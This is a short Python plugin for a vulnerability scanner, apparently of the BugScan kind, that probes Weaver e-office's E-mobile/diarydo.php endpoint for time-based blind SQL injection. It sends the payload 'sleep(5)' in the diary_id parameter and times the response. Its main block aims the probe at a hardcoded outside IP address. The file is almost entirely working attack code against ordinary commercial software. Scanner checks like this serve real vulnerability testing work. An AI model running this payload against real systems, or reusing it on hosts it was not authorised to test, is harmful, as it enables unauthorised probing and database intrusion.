#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = Mr.R
#_PlugName_ = 泛微e-office时间盲注
import time


def assign(service, arg):
    if service == "weaver_oa":
        return True, arg 

def audit(arg):
    true_url=arg+'E-mobile/diarydo.php?diff=reply&diary_id=1'
    start_time1=time.time()
    code1,head1,body1,errcode1,fina_url1=curl.curl2(true_url)
    true_time=time.time()-start_time1

    flase_url=arg+'E-mobile/diarydo.php?diff=reply&diary_id=sleep(5)'
    start_time2=time.time()
    code2,head2,body2,errcode2,fina_url2=curl.curl2(flase_url)
    flase_time=time.time()-start_time2
    if code1==200 and code2==200 and flase_time>true_time and flase_time>5:
        security_hole(true_url)
if __name__ == '__main__':
    from dummy import *
    audit(assign('weaver_oa', "http://122.224.149.30:8082/")[1])